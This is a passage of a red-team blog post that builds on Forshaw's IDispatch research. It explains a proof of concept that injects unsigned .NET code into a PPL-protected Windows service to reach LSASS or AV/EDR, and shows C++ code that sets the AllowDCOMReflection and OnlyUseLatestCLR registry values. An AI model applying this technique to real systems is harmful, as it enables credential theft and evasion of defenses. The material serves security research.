# https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes

<!DOCTYPE html><html lang="en" class="rounded-corners theme-muted no-tint sidebar-filled sidebar-list-default links-default depth-subtle __variable_7d5705 __variable_4d8f45 __variable_7857c7 font-Inter sheet-open:gutter-stable dark" style="color-scheme: dark;"><body class="site-background sheet-open:overflow-hidden"><div><!--$--><!--/$--></div><div class="pointer-events-none fixed inset-x-0 top-0 z-50 h-0.5 overflow-hidden hidden animate-fade-out-slow"><div class="h-full w-full origin-left animate-crawl bg-primary-solid theme-bold:bg-header-link"></div></div><div class="motion-safe:transition-all motion-safe:duration-300 lg:chat-open:mr-80 xl:chat-open:mr-96"><div class="flex flex-col lg:flex-row lg:justify-center px-4 pl-[max(env(safe-area-inset-left),1rem)] pr-[max(env(safe-area-inset-right),1rem)] sm:px-6 sm:pl-[max(env(safe-area-inset-left),1.5rem)] sm:pr-[max(env(safe-area-inset-right),1.5rem)] md:px-8 md:pl-[max(env(safe-area-inset-left),2rem)] md:pr-[max(env(safe-area-inset-right),2rem)] max-w-screen-2xl mx-auto site-width-wide:max-w-screen-4xl transition-[max-width] duration-300"><div id="side-sheet-overlay" class="fixed inset-0 z-40 items-start bg-tint-base/3 not-hydrated:opacity-0 starting:opacity-0 starting:backdrop-blur-none transition-[opacity,display,backdrop-filter] transition-discrete duration-250 dark:bg-tint-base/6 hidden opacity-0 backdrop-blur-none"></div><div class="contents"><div class="contents [--content-scroll-margin:calc(var(--spacing)*16)]"><main class="relative min-w-0 flex-1 max-w-screen-2xl py-8 break-anywhere @container page-width-default site-width-default page-has-toc"><div class="flex flex-col [&amp;>*+*]:mt-5 whitespace-pre-wrap"><h2 id="introduction" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#introduction"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_g38qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_g38qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">Introduction</div></h2><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">In this post, I explore an interesting bug class identified by <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://infosec.exchange/@tiraniddo"><strong class="font-bold">James Forshaw</strong><svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_j058qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_j058qav5ukqiv5ubsnpfivb_)"></rect></svg></a> from <strong class="font-bold">Google Project Zero</strong> that relates to the <strong class="font-bold">IDispatch interface</strong> in COM servers. His research highlights a vulnerability in how certain COM servers, particularly those implementing the <strong class="font-bold">IDispatch interface</strong>, allow the creation of arbitrary objects within the process. Notably, every <strong class="font-bold">Object-Oriented Programming (OOP)</strong> COM server implementing <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">IDispatch</code> exposes the ability to create objects like <strong class="font-bold">STDFONT</strong>, which was never intended to be used safely across process boundaries. This opens the door to potential exploitation, especially when interacting with <strong class="font-bold">cross-process</strong> COM remoting.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Forshaw’s work demonstrated the <strong class="font-bold">security risks</strong> in these implementations but did not provide a complete <strong class="font-bold">Proof of Concept (PoC)</strong>. Drawing inspiration from his research and driven by my passion for <strong class="font-bold">COM object exploitation</strong>, I decided to take on the challenge and develop a <strong class="font-bold">functional PoC</strong> in C++. This blog expands on Forshaw’s findings, providing a working PoC that shows how the misuse of this COM feature can be leveraged to <strong class="font-bold">inject unsigned code into a Protected Process Light (PPL) process </strong>with the protection<strong class="font-bold"> </strong><span class="text-red-500 contrast-more:text-red-800"><strong class="font-bold">PsProtectedSignerWindows-Light</strong></span><strong class="font-bold">.</strong></p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">This PoC demonstrates how the technique can bypass <strong class="font-bold">Protected Process Light (PPL)</strong> protection, highlighting the significant real-world implications of this vulnerability. It provides a powerful means of accessing critical protected processes, such as <strong class="font-bold">LSASS </strong>with<strong class="font-bold"> </strong>LSA protection  or a protected <strong class="font-bold">AV/EDR</strong>.</p><h2 id="bridging-native-code-and-.net-for-ppl-bypass" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#bridging-native-code-and-.net-for-ppl-bypass"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_gb8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_gb8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight"><strong class="font-bold">Bridging Native Code and .NET for PPL bypass</strong></div></h2><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">This section dissects the core mechanism of our exploit: <strong class="font-bold">leveraging C++/mscorlib interoperability to hijack COM activation and force the execution of arbitrary .NET code under the guise of trusted process</strong>.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">At its core, this exploit leverages the Windows Update Medic Service’s WaaSRemediationAgent COM server, — a privileged component running as svchost.exe within a PPL process protected by <span class="text-red-500 contrast-more:text-red-800"><strong class="font-bold">PsProtectedSignerWindows-Light</strong></span> — to load and execute am unsigned .NET payload. </p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="eager" class="block" src="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/~gitbook/image?url=https%3A%2F%2F615064086-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MXlxki-LGPmhYCBAzg5%252Fuploads%252FW3LIeyu5W2TZp0vMBbFK%252Fimage.png%3Falt%3Dmedia%26token%3De0489427-fdf9-451a-8228-992654e67fed&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=a60df274&amp;sv=2" width="389" height="263"></div></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">By manipulating registry keys to enable DCOM reflection and redirect COM activation, we trick the system into treating a legacy COM class (<code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">StdFont</code>) as a <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">.NET System.Object</code>, effectively bridging the native and managed worlds.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">By <strong class="font-bold">using mscorlib (the .NET runtime library) to reflectively load and execute an in-memory .NET assembly</strong> while masquerading as a benign COM operation. This bypasses PPL restrictions because the CLR (Common Language Runtime), once activated within a privileged process, inherently trusts code loaded via mscorlib's reflection APIs.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">In the following breakdown, we’ll explore:</p><ol class="min-w-0 space-y-2 mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl page-api-block:ml-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'1.';--font-family:inherit;font-size:min(1em, 24px)"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start"><strong class="font-bold">COM-to-.NET Redirection</strong>: How registry manipulation forces COM to activate .NET objects.</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'2.';--font-family:inherit;font-size:min(1em, 24px)"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start"><strong class="font-bold">mscorlib as a Bridge</strong>: Using `System.Object` and <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">System.Reflection</code> to load malicious assemblies.</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'3.';--font-family:inherit;font-size:min(1em, 24px)"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start"><strong class="font-bold">In-Memory Execution</strong>: Avoiding disk writes by directly invoking .NET methods from C++.</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'4.';--font-family:inherit;font-size:min(1em, 24px)"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start"><strong class="font-bold">PPL Bypass</strong>: Why the CLR’s trust in mscorlib allows unverified code to run in protected processes.</p></div></li></ol><h3 id="registry-manipulation-creating-the-com-to-.net-redirection" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#registry-manipulation-creating-the-com-to-.net-redirection"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_gr8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_gr8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">Registry Manipulation: Creating the COM-to-.NET Redirection</div></h3><h4 id="enabling-dcom-reflection" class="text-base @xs:text-lg @lg:text-xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.5em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#enabling-dcom-reflection"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_gt8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_gt8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug"><strong class="font-bold">Enabling DCOM Reflection</strong></div></h4><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The registry key DCOM Reflection is enabled to allow COM objects to reflectively call into the managed code. This step allows COM to be aware of the .NET objects that exist and interact with them.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_118qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">// Code snippet<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">bool RegistryUtils::SetDcomReflectionEnabled(bool enable) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    HKEY hKey;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    LPCWSTR subKey = L"SOFTWARE\\Microsoft\\.NETFramework";<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    LPCWSTR valueName = L"AllowDCOMReflection";<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    LONG result = RegCreateKeyEx(HKEY_LOCAL_MACHINE, subKey, 0, nullptr,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        REG_OPTION_NON_VOLATILE, KEY_WRITE, nullptr, &amp;hKey, nullptr);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    if (result != ERROR_SUCCESS) return false;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    DWORD data = enable ? 1 : 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    result = RegSetValueEx(hKey, valueName, 0, REG_DWORD,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        reinterpret_cast&lt;const BYTE*&gt;(&amp;data), sizeof(data));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    RegCloseKey(hKey);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    return result == ERROR_SUCCESS;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">By enabling this, you configure COM to be able to dynamically locate and invoke managed code through reflection.</p><h4 id="enabling-onlyuselatestclr" class="text-base @xs:text-lg @lg:text-xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.5em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#enabling-onlyuselatestclr"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_h58qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_h58qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug"><strong class="font-bold">Enabling OnlyUseLatestCLR</strong></div></h4><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The registry key <span class="text-red-500 contrast-more:text-red-800"><strong class="font-bold">onlyUseLatestCLR </strong></span>is set, ensuring that the latest version of the .NET runtime (CLR) is used for managed code execution. This step was particularly important during the testing phase, as issues were encountered when trying to run the code with <strong class="font-bold">.NET v4</strong>. Initially, the exploit relied on <strong class="font-bold">.NET v2</strong>, which was still present on the system, but <strong class="font-bold">.NET v4</strong> introduced some compatibility challenges.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">As James Forshaw pointed out in his blog, <strong class="font-bold">.NET COM objects default to running under v2 of the framework</strong>. However, starting with Windows 10, .NET v2 is not installed by default, which caused issues for running the exploit in a modern environment. To avoid these issues, Forshaw installed .NET v2 manually via the <strong class="font-bold">Windows Components Installer</strong>. For testing with .NET v4, however, setting the registry key to <strong class="font-bold">OnlyUseLatestCLR</strong> ensured that the system would always use the latest CLR (v4), avoiding the need to manually install an older version of .NET.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_1b8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">// Code snippet<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">bool RegistryUtils::SetOnlyUseLatestCLR(bool enable) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    HKEY hKey;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    LPCWSTR subKey = L"SOFTWARE\\Microsoft\\.NETFramework";<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    LPCWSTR valueName = L"OnlyUseLatestCLR";<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    LONG result = RegCreateKeyEx(HKEY_LOCAL_MACHINE, subKey, 0, nullptr,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        REG_OPTION_NON_VOLATILE, KEY_WRITE, nullptr, &amp;hKey, nullptr);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    if (result != ERROR_SUCCESS) return false;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">    DWORD data = enable ? 1 : 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    result = RegSetValueEx(hKey, valueName, 0, REG_DWORD,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        reinterpret_cast&lt;const BYTE*&gt;(&amp;data), sizeof(data));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    RegCloseKey(hKey);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    return result == ERROR_SUCCESS;<!-- -->
